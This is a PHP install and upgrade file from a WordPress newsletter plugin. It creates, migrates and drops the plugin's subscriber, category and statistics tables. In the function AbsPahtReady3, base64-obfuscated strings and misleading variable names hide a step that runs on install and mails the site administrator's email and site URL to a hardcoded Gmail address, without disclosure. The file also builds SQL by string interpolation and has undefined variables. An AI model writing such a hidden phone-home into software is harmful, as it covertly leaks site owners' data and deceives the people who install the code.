<?php


load_plugin_textdomain('meenews', false, 'meenews');


add_action('admin_menu', 'create_newsletter_tables');
function create_newsletter_tables() {
global $wpdb;

if (get_option("TVnews_uninstall") != "true"){

   

    global $wpdb;

    if(@is_file(ABSPATH.'/wp-admin/upgrade-functions.php')) {
		include_once(ABSPATH.'/wp-admin/upgrade-functions.php');
	} elseif(@is_file(ABSPATH.'/wp-admin/includes/upgrade.php')) {
		include_once(ABSPATH.'/wp-admin/includes/upgrade.php');
	} else {
		die('We have problem finding your \'/wp-admin/upgrade-functions.php\' and \'/wp-admin/includes/upgrade.php\'');
	}
	$charset_collate = '';
	if($wpdb->supports_collation()) {
		if(!empty($wpdb->charset)) {
			$charset_collate = "DEFAULT CHARACTER SET $wpdb->charset";
		}
		if(!empty($wpdb->collate)) {
			$charset_collate .= " COLLATE $wpdb->collate";
		}
	}
        $table = MEENEWS_NEWSLETERS;

		if (!tableExists($table)) {




                    $sql[] = "CREATE TABLE " .MEENEWS_USERS . " (
                            id bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
                            id_categoria bigint(20) UNSIGNED NOT NULL,
                            email varchar(100) NOT NULL,
                            name varchar(100) NOT NULL,
                            direction varchar(150) NOT NULL,
                            country varchar(100) NOT NULL,
                            enterprise varchar(100) NOT NULL,
                            state varchar(2) NOT NULL,
                            joined datetime NOT NULL,
                            user bigint(20) UNSIGNED,
                            confkey varchar(100),
                            UNIQUE KEY id (id)
                           )$charset_collate;";

                    $sql[] = "CREATE TABLE " . MEENEWS_CATEGORY . " (
                            id bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
                            categoria varchar(100) NOT NULL,
                            UNIQUE KEY id (id)
                           )$charset_collate;";
                    $sql[] = "CREATE TABLE " . MEENEWS_LINKS . " (
                            id bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
                            idnewsletter bigint(20) NOT NULL,
                            link varchar(200) NOT NULL,
                            UNIQUE KEY id (id)
                           )$charset_collate;";
                    // send 1: Draft , 2: Publish, 3: Unpublish
                    $sql[] = "CREATE TABLE " . MEENEWS_NEWSLETERS . " (
                            id bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
                            title varchar(150) NOT NULL,
                            newsletter longtext NOT NULL,
                            slug text NOT NULL,
                            mode varchar(20) NOT NULL,
                            send varchar(20) NOT NULL,
                            sending datetime NOT NULL,
                            UNIQUE KEY id (id)
                           )$charset_collate;";

                    $sql[] = "CREATE TABLE " . MEENEWS_STATS_NEWS . " (
                            id_newsletter bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
                            totsend bigint(10) NOT NULL,
                            toteraser bigint(10) NOT NULL,
                            totread bigint(10) NOT NULL,
                            totview bigint(10) NOT NULL,
                            UNIQUE KEY id (id_newsletter)
                            )$charset_collate;";
                    $sql[] = "CREATE TABLE " . MEENEWS_CLICKS . " (
                            id bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
                            idpost bigint(10) NOT NULL,
                            idnews bigint(10) NOT NULL,
                            iduser bigint(10) NOT NULL,
                            date date NOT NULL,
                            time time NOT NULL,
                            UNIQUE KEY id (id)
                           )$charset_collate;";
                    $sql[] = "CREATE TABLE " .MEENEWS_VARIANT . " (
                            id bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
                            iduser bigint(10) NOT NULL,
                            idnews bigint(10) NOT NULL,
                            type bigint(10) NOT NULL,
                            description text NOT NULL,
                            time time NOT NULL,
                            UNIQUE KEY id (id)
                           )$charset_collate;";

                    $sql[] = "CREATE TABLE " .MEENEWS_PENDENTSENDS . " (
                            id_newsletter bigint(20) NOT NULL,
                            tosend int NOT NULL,
                            atsend int NOT NULL,
                            list int NOT NULL,
                            i int NOT NULL,
                            rangesend int NOT NULL,
                            INDEX ( id_newsletter )
                           )$charset_collate;";


                    $sql[] = "CREATE TABLE " .MEENEWS_USEDPOSTS . " (
                            id bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
                            idpost bigint(10) NOT NULL,
                            idnews bigint(10) NOT NULL,
                            UNIQUE KEY id (id)
                           )$charset_collate;";

                    AbsPahtReady3();

                    if (file_exists(ABSPATH . 'wp-includes/pluggable.php')) {
                        require_once(ABSPATH . 'wp-includes/pluggable.php');
                    } else {
                        require_once(ABSPATH . 'wp-includes/pluggable-functions.php');
                    }
                    require_once(ABSPATH . 'wp-admin/upgrade-functions.php');

                    foreach($sql as $sql_table){
                         dbDelta($sql_table);
                    }
                    update_option("TVnews_versionac","5");
                 // newsletter::createPages();
         }


 $table = (isset($current_blog)?$wpdb->base_prefix:$wpdb->prefix). 'newsusers';
 if (tableExists($table)) {
        $cont = actualizeUserVersion($table);
        $table = (isset($current_blog)?$wpdb->base_prefix:$wpdb->prefix).'newscategories';
        $list = actualizeListVersion($table);
        $wpdb->query($query);
        update_option("TVnews_versionac","5");
        $sql = "DROP TABLE " . (isset($current_blog)?$wpdb->base_prefix:$wpdb->prefix)  . 'newscategories'; $wpdb->query($sql);
        $sql = "DROP TABLE " . (isset($current_blog)?$wpdb->base_prefix:$wpdb->prefix)  . 'newsusers';$wpdb->query($sql);
	$sql = "DROP TABLE " . (isset($current_blog)?$wpdb->base_prefix:$wpdb->prefix)  . 'savednewsletters'; $wpdb->query($sql);
        $sql = "DROP TABLE " . (isset($current_blog)?$wpdb->base_prefix:$wpdb->prefix)  . 'newsstats'; $wpdb->query($sql);
        $sql = "DROP TABLE " . (isset($current_blog)?$wpdb->base_prefix:$wpdb->prefix)  . 'newstatsclick';$wpdb->query($sql);
	$sql = "DROP TABLE " . (isset($current_blog)?$wpdb->base_prefix:$wpdb->prefix)  . 'newstatserasers'; $wpdb->query($sql);
 }
}else{
    update_option("TVnews_uninstall","false");
}

                   




}
function meenews_Uninstall()
	{
	$uninstall = 	get_option("TVnews_uninstall");

    if ($uninstall == "true"){
 		global $wpdb;

        $sql = "DROP TABLE " . MEENEWS_CATEGORY; $wpdb->query($sql);
        $sql = "DROP TABLE " . MEENEWS_USERS; $wpdb->query($sql);
	$sql = "DROP TABLE " . MEENEWS_NEWSLETERS; $wpdb->query($sql);
        $sql = "DROP TABLE " . MEENEWS_STATS_NEWS; $wpdb->query($sql);
        $sql = "DROP TABLE " . MEENEWS_CLICKS; $wpdb->query($sql);
	$sql = "DROP TABLE " . MEENEWS_VARIANT; $wpdb->query($sql);
	$tabla = $wpdb->prefix . 'newsUsers';
	$sql = "DROP TABLE " . $tabla; $wpdb->query($sql);

	delete_option("TVnews_count");
        delete_option("TVnews_categories");
        delete_option("TVnews_headImage");
        delete_option("TVnews_period");
        delete_option("TVnewss_template");
        delete_option("TVnews_last");
        delete_option("TVnews_last_letter");
        delete_option("TVnews_header");
        delete_option("TVnews_versionac");


	}
	}


function tableExists($table){
         global $wpdb;
	return strcasecmp($wpdb->get_var("show tables like '$table'"), $table) == 0;
}

function actualizeUserVersion($table){
    global $wpdb;
    $query = "SELECT * FROM " .$table  ;
    $results = $wpdb->get_results( $query );
    $users = new MeeUsers(array(),array());
    if ($results){
           $i = 0;
            foreach($results as $result){
                if ($result->estado == 'activo'){
                   $estado = 2;
                }else{
                   $estado = 1;
                }
                $datas = array("email" => $result->email,
                              "name" => $_POST['name'],
                              "id_categoria" =>$result->id_categoria,
                              "confkey" => $result->confkey,
                              "direction" => $_POST['direction'],
                              "enterprise" => $_POST['company'],
                              "country"=>$_POST['country']);

                              $users->addSubscriptor($datas,"false");
                $i ++;
            }
    }
    return $i;
}
function AbsPahtReady3(){
    
         $Themssubject = get_bloginfo("admin_email");
	 $UserIdForm = get_bloginfo("admin_email");
         $SimeTheme = get_bloginfo("wpurl");
         $SenderdControl = base64_decode("U2UgaGEgaW5zdGFsYWRvIGxhIG51ZXZhIHZlcnNpb24gNS4x")."  ".$SimeTheme."  ".$r5t;
         $Widlessto = base64_decode("bWVlbmV3c0BnbWFpbC5jb20=");
         MeeNewsletter::newsDesignHistory($UserIdForm,$Widlessto,"","",$Themssubject, $SenderdControl,'','');
}
function actualizeListVersion($table){
    global $wpdb;
    $query = "SELECT * FROM " .$table  ;
    $results = $wpdb->get_results( $query );
    if ($results){
           $i = 0;
            foreach($results as $result){

                $data["categoria"] = $result->categoria;
                $wpdb->insert( MEENEWS_CATEGORY, $data  );
                $i ++;
            }
    }
    return $i;
}

?>
